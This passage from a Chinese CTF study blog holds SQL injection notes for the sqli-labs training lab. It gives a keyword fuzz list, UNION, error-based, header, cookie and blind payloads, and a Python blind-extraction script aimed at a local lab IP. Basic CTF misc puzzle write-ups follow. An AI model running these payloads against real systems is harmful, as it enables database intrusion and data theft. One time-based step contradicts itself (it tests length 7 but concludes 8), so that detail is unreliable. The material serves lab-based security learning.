<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;7,sleep(5),1)%20--+</span><br><span class="line">有延迟，说明数据库名称长度为8</span><br></pre></td></tr></table></figure>
<h1 id="sql常规关键字fuzz字典"><a href="#sql常规关键字fuzz字典" class="headerlink" title="sql常规关键字fuzz字典"></a>sql常规关键字fuzz字典</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">参考：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;zhangqianxi&#x2F;p&#x2F;13452718.html</span><br><span class="line">length</span><br><span class="line">Length</span><br><span class="line">+</span><br><span class="line">handler</span><br><span class="line">likeLiKe</span><br><span class="line">selectSeleCT </span><br><span class="line">sleepSLEEp</span><br><span class="line">databaseDATABASe</span><br><span class="line">delete</span><br><span class="line">having</span><br><span class="line">oroR</span><br><span class="line">asAs</span><br><span class="line">-~</span><br><span class="line">BENCHMARK</span><br><span class="line">limitLimIt</span><br><span class="line">leftLeft</span><br><span class="line">selectSELECT</span><br><span class="line">insertinsERTINSERT</span><br><span class="line">right</span><br><span class="line">#</span><br><span class="line">--+</span><br><span class="line">INFORMATION</span><br><span class="line">--</span><br><span class="line">;</span><br><span class="line">!</span><br><span class="line">%</span><br><span class="line">+</span><br><span class="line">xor</span><br><span class="line">&lt;&gt;</span><br><span class="line">(</span><br><span class="line">&gt;</span><br><span class="line">&lt;</span><br><span class="line">)</span><br><span class="line">.</span><br><span class="line">^</span><br><span class="line">&#x3D;</span><br><span class="line">ANDANd</span><br><span class="line">BYBy</span><br><span class="line">CAST</span><br><span class="line">COLUMNCOlumn</span><br><span class="line">COUNTCount</span><br><span class="line">CREATE</span><br><span class="line">END</span><br><span class="line">case</span><br><span class="line">&#39;1&#39;&#x3D;&#39;1</span><br><span class="line">when</span><br><span class="line">admin&#39;</span><br><span class="line">&quot;</span><br><span class="line">length </span><br><span class="line">+</span><br><span class="line">REVERSE</span><br><span class="line"></span><br><span class="line">asciiASSICASSic</span><br><span class="line">select </span><br><span class="line">database</span><br><span class="line">left</span><br><span class="line">right</span><br><span class="line">unionUNIonUNION</span><br><span class="line">&quot;</span><br><span class="line">&amp;</span><br><span class="line">&amp;&amp;</span><br><span class="line">||</span><br><span class="line">oorr</span><br><span class="line">&#x2F;</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;*</span><br><span class="line">*&#x2F;*</span><br><span class="line">&#x2F;**&#x2F;</span><br><span class="line">anandd</span><br><span class="line">GROUP</span><br><span class="line">HAVING</span><br><span class="line">IF</span><br><span class="line">INTO</span><br><span class="line">JOIN</span><br><span class="line">LEAVE</span><br><span class="line">LEFT</span><br><span class="line">LEVEL</span><br><span class="line">sleep</span><br><span class="line">LIKE</span><br><span class="line">NAMES</span><br><span class="line">NEXT</span><br><span class="line">NULL</span><br><span class="line">OF</span><br><span class="line">ON</span><br><span class="line">|</span><br><span class="line">infromation_schema</span><br><span class="line">user</span><br><span class="line">OR</span><br><span class="line">ORDER</span><br><span class="line">ORD</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">UNION</span><br><span class="line">UPDATE</span><br><span class="line">USER</span><br><span class="line">USING</span><br><span class="line">VALUE</span><br><span class="line">VALUES</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">ADD</span><br><span class="line">AND</span><br><span class="line">prepare</span><br><span class="line">set</span><br><span class="line">update</span><br><span class="line">delete</span><br><span class="line">drop</span><br><span class="line">inset</span><br><span class="line">CAST</span><br><span class="line">COLUMN</span><br><span class="line">CONCAT</span><br><span class="line">GROUP_CONCAT</span><br><span class="line">group_concat</span><br><span class="line">CREATE</span><br><span class="line">DATABASE</span><br><span class="line">DATABASES</span><br><span class="line">alter</span><br><span class="line">DELETE</span><br><span class="line">DROP</span><br><span class="line">floor</span><br><span class="line">rand()</span><br><span class="line">information_schema.tables</span><br><span class="line">TABLE_SCHEMA</span><br><span class="line">%df</span><br><span class="line">concat_ws()</span><br><span class="line">concat</span><br><span class="line">LIMIT</span><br><span class="line">ORD</span><br><span class="line">ON</span><br><span class="line">extractvalue</span><br><span class="line">order </span><br><span class="line">CAST()</span><br><span class="line">by</span><br><span class="line">ORDER</span><br><span class="line">OUTFILE</span><br><span class="line">RENAME</span><br><span class="line">REPLACE</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">updatexml</span><br><span class="line">SHOW</span><br><span class="line">SQL</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">TRUE</span><br><span class="line">instr</span><br><span class="line">benchmark</span><br><span class="line">format</span><br><span class="line">bin</span><br><span class="line">substring</span><br><span class="line">ord</span><br><span class="line"></span><br><span class="line">UPDATE</span><br><span class="line">VALUES</span><br><span class="line">VARCHAR</span><br><span class="line">VERSION</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">&#x2F;*</span><br><span class="line">&#96;</span><br><span class="line">  </span><br><span class="line">,</span><br><span class="line">users</span><br><span class="line">%0a%0A</span><br><span class="line">%0b</span><br><span class="line">mid</span><br><span class="line">for</span><br><span class="line">BEFORE</span><br><span class="line">REGEXP</span><br><span class="line">RLIKE</span><br><span class="line">in</span><br><span class="line">sys schemma</span><br><span class="line">SEPARATOR</span><br><span class="line">XOR</span><br><span class="line">CURSOR</span><br><span class="line">FLOOR</span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">INFILE</span><br><span class="line">count</span><br><span class="line">%0c</span><br><span class="line">from</span><br><span class="line">%0d</span><br><span class="line">%a0</span><br><span class="line">&#x3D;</span><br><span class="line">@</span><br><span class="line">else</span><br><span class="line">or</span><br><span class="line">Or</span><br></pre></td></tr></table></figure>


<h1 id="regexp-1"><a href="#regexp-1" class="headerlink" title="regexp"></a>regexp</h1><p>用于显示不全，使用正则匹配搜索匹配的flag的情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)</span><br></pre></td></tr></table></figure>


<h1 id="sqllab题目"><a href="#sqllab题目" class="headerlink" title="sqllab题目"></a>sqllab题目</h1><h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><p>做法1：count()和floor()的查询注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 爆数据库名</span><br><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat( (select database()),floor(rand(0)*2)  ) as a from information_schema.tables group by a --+</span><br><span class="line"># 爆表名，注意表名过多，所以要逐个爆 limit i,1</span><br><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat( (select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),floor(rand(0)*2)  ) as a from information_schema.tables group by a --+</span><br><span class="line"># 爆列名</span><br><span class="line">id&#x3D;-1&#39; union select 1,count(*),concat( (select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),floor(rand(0)*2)  ) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
<p>做法2：updatexml()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 爆数据库名</span><br><span class="line">?id&#x3D;-1&#39; and updatexml(1,concat(&#39;~&#39;,database()),1) --+</span><br><span class="line">后面把payload替换一下</span><br></pre></td></tr></table></figure>
<h2 id="Less6"><a href="#Less6" class="headerlink" title="Less6"></a>Less6</h2><p>与Less5相同，Less5为单引号，本题为双引号</p>
<h2 id="Less7"><a href="#Less7" class="headerlink" title="Less7"></a>Less7</h2><p>跳过 ，环境有问题</p>
<h2 id="Less8"><a href="#Less8" class="headerlink" title="Less8"></a>Less8</h2><p>考察：布尔盲注</p>
<p>不返回报错信息，但是根据sql语句正确性会有不同的回显</p>
<p>以下脚本，注意数据库逐位判断处为一个等号</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://192.168.64.2/sqllabs/Less-8?id=1&#x27; and %s--+&quot;</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">success_text = <span class="string">&quot;You are in...........&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	flag = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">		c = <span class="built_in">chr</span>(j)</span><br><span class="line">		s = <span class="string">&quot;substr(database(),&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1)=&#x27;&quot;</span> + c + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">		response = requests.get(url%s)</span><br><span class="line">		print(url%s)</span><br><span class="line">		<span class="keyword">if</span> success_text <span class="keyword">in</span> response.text:</span><br><span class="line">			flag = <span class="number">1</span></span><br><span class="line">			ans = ans + c</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure>
<h2 id="Less9"><a href="#Less9" class="headerlink" title="Less9"></a>Less9</h2><p>考察：时间盲注</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用时间盲注</span><br><span class="line">    ?id&#x3D;1&#39; and sleep(5) --+</span><br><span class="line">延时大概5秒，说明可以采用时间盲注</span><br><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;7,sleep(5),1)%20--+</span><br><span class="line">有延迟，说明数据库名称长度为8</span><br></pre></td></tr></table></figure>
<h2 id="Less11"><a href="#Less11" class="headerlink" title="Less11"></a>Less11</h2><p>考察：post注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">方法1：报错注入</span><br><span class="line">	post数据：uname&#x3D;admin1&#39; union select 1,database() #&amp;passwd&#x3D;1</span><br><span class="line">方法2：双查询注入</span><br><span class="line">	post数据：uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(&#39;~&#39;,database()),1) #</span><br><span class="line">	之后与Less5相同</span><br></pre></td></tr></table></figure>
<h2 id="Less15"><a href="#Less15" class="headerlink" title="Less15"></a>Less15</h2><p>考察：post注入，时间盲注</p>
<p>环境有问题，跳过</p>
<h2 id="Less17"><a href="#Less17" class="headerlink" title="Less17"></a>Less17</h2><p>环境有问题</p>
<h2 id="Less18"><a href="#Less18" class="headerlink" title="Less18"></a>Less18</h2><p>考察：head头注入，user_agent注入，双查询注入</p>
<p>阅读源码，插入了uagent字段，但是未做合法性检测，因此可以用双查询注入</p>
<p>burp修改包的head部分中的user–agent</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and updatexml(1,concat(&#39;~&#39;,(database())),1) and &#39;1&#39;&#x3D;&#39;1--+</span><br><span class="line"># 注意最后一定要有and &#39;1&#39;&#x3D;&#39;1 用于闭合引号，否则不能得到结果</span><br></pre></td></tr></table></figure>
<h2 id="Less19"><a href="#Less19" class="headerlink" title="Less19"></a>Less19</h2><p>同Less18，本次uagent的值从referer中获得，因此在referer进行注入</p>
<h2 id="Less20"><a href="#Less20" class="headerlink" title="Less20"></a>Less20</h2><p>考察：cookie注入</p>
<p>正常走一遍流程，发现回显的cookie为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname:admin</span><br></pre></td></tr></table></figure>
<p>再次刷新页面时，在包中会直接发送该cookie</p>
<p>修改该cookie为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and updatexml(1,concat(&#39;~&#39;,(database())),1) and &#39;1&#39;&#x3D;&#39;1--+</span><br></pre></td></tr></table></figure>
<p>得到数据库名</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/15/CTF-Web-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" data-id="ckkdrz0yy0001ugusdm9dcp4m" data-title="SQL注入总结" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/12/hello-world/" class="article-date">
  <time class="dt-published" datetime="2021-01-12T13:52:17.596Z" itemprop="datePublished">2021-01-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/12/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/12/hello-world/" data-id="ckk1u3o4j0002tsus73gadf65" data-title="Hello World" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-wp-攻防世界答案记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/31/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/" class="article-date">
  <time class="dt-published" datetime="2020-12-31T06:40:57.000Z" itemprop="datePublished">2020-12-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/31/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/">CTF答案记录</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="攻防世界-misc初级"><a href="#攻防世界-misc初级" class="headerlink" title="攻防世界 misc初级"></a>攻防世界 misc初级</h1><h2 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this is flag"></a>this is flag</h2><p>提交flag{th1s_!s_a_d4m0_4la9}即可</p>
<h2 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h2><p>做法1：pdf转word后看到答案</p>
<p>在线转换地址<a target="_blank" rel="noopener" href="https://app.xunjiepdf.com/pdf2word/">https://app.xunjiepdf.com/pdf2word/</a></p>
<p>做法2：chrome打开pdf，直接ctrl+f搜索flag</p>
<h2 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h2><p>正常打开gif，发现最后有一个二维码</p>
<p>用ps打开gif，找到那一帧，找到对应二维码</p>
<p>二维码需要四个角中三个角添加定位方块，用ps添加定位方块后，随便一个二维码扫描工具得到flag</p>
<h2 id="坚持60s"><a href="#坚持60s" class="headerlink" title="坚持60s"></a>坚持60s</h2><p>得到jar文件，可以用压缩包软件打开文件还原出工程</p>
<p>使用idea打开工程，在爆炸文件下得到明文flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}</p>
<p>提交后显示flag错误，使用base64对flag中内容解码得到但</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;DajiDali_JinwanChiji&#125;</span><br></pre></td></tr></table></figure>
<h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>得到104张黑白图片</p>
<p>使用python读取文件，白为0黑为1，得到一个字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">white &#x3D; open(&quot;.&#x2F;0.jpg&quot;,&quot;rb&quot;).read()</span><br><span class="line">black &#x3D; open(&quot;.&#x2F;1.jpg&quot;,&quot;rb&quot;).read()</span><br><span class="line"></span><br><span class="line">flag_dic &#x3D; &quot;&quot;</span><br><span class="line">for i in range(104):</span><br><span class="line">	with open(&quot;.&#x2F;%d.jpg&quot;%i,&quot;rb&quot;) as f:</span><br><span class="line">		if f.read() &#x3D;&#x3D; white:</span><br><span class="line">			flag_dic +&#x3D; &quot;0&quot;</span><br><span class="line">		else:</span><br><span class="line">			flag_dic +&#x3D; &quot;1&quot;</span><br><span class="line">print(flag_dic)</span><br><span class="line"></span><br><span class="line">01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101</span><br></pre></td></tr></table></figure>
<p>使用在线的二进制转字符串工具得到答案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;FuN_giF&#125;</span><br></pre></td></tr></table></figure>
<h2 id="掀桌子"><a href="#掀桌子" class="headerlink" title="掀桌子"></a>掀桌子</h2><p>最大字符不超过f，判断为十六进制</p>
<p>将两个连续数字设为一个字节，代表一个符号。所有字节大于128，而ASCII码表均小于128，故均减去128</p>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str &#x3D; &quot;c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2&quot;</span><br><span class="line">count &#x3D; 0</span><br><span class="line">tempstr &#x3D; &quot;&quot;</span><br><span class="line">ans &#x3D; &quot;&quot;</span><br><span class="line">for s in str:</span><br><span class="line">	tempstr +&#x3D; s</span><br><span class="line">	if len(tempstr) &#x3D;&#x3D; 2:</span><br><span class="line">		ans +&#x3D; chr(int(tempstr, 16) - 128)</span><br><span class="line">		# print(int(tempstr, 16))</span><br><span class="line">		tempstr &#x3D; &quot;&quot;</span><br><span class="line">print(ans)</span><br><span class="line"></span><br><span class="line">Hi, FreshDog! The flag is: hjzcydjzbjdcjkzkcugisdchjyjsbdfr</span><br></pre></td></tr></table></figure>
<h2 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h2><p>使用与佛论禅论坛，<a target="_blank" rel="noopener" href="http://keyfc.net/bbs/tools/tudoucode.aspx%EF%BC%8C%E5%AF%B9%E6%96%87%E5%AD%97%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86%E5%BE%97%E5%88%B0">http://keyfc.net/bbs/tools/tudoucode.aspx，对文字进行解密得到</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</span><br></pre></td></tr></table></figure>
<p>根据题目提示，使用ROT13编码进行解密</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9</span><br></pre></td></tr></table></figure>
<p>再使用base64进行编码，得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bdscjhbkzmnfrdhbvckijndskvbkjdsab&#125;</span><br></pre></td></tr></table></figure>
<h2 id="stegano"><a href="#stegano" class="headerlink" title="stegano"></a>stegano</h2><p>工具：福昕pdf编辑器</p>
<p>思路：从pdf文件中找到字符，再进行加解密</p>
<p>去除无用信息后，选中“编辑对象”，框选一大片区域，发现字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB</span><br></pre></td></tr></table></figure>
<p>类似于培根密码，但培根密码为5位一组，不符合。此字符串中只有AB两种字符，类似于二进制，联想摩斯密码，解密后得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1nv151bl3m3554g3&#125;</span><br></pre></td></tr></table></figure>
<h3 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h3><p>采用a和b两种字符表示的字符串，5位字符一组</p>
<h3 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h3><h2 id="simpleRAR"><a href="#simpleRAR" class="headerlink" title="simpleRAR"></a>simpleRAR</h2><p>工具：winhex，stegsolve（图片隐写工具），photoshop</p>
<p>首先下载得到一个rar文件，打开后提示“secure.png”文件头损坏。</p>
<p>尝试使用winrar直接修复，结果是把secure.png直接删除。尝试失败。</p>
<p>上网查阅rar块构成后，将“Cflag is not here?”后十六进制的7A更改为74。成功解压得到secure.png</p>
<p>根据题目提示，将png放入photoshop中。photoshop提示非png文件。</p>
<p>使用winhex打开secure.png，头部标识</p>
